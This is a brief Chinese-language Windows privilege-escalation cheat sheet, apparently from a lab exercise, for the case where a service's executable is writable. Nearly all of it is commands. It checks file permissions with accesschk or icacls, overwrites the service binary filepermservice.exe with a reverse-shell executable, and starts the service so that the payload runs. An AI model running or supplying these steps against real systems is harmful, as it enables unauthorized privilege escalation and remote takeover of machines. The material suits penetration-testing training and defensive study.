# 当bin目录是一个可执行文件

> **可读写**\
> **bin目录是一个可执行文件**

```python
1. 审查用户权限（看能否读写）
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
或者
icacls "C:\Program Files\File Permissions Service \filepermservice.exe"
2. 覆盖
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
3. 启动
net start filepermsvc
```
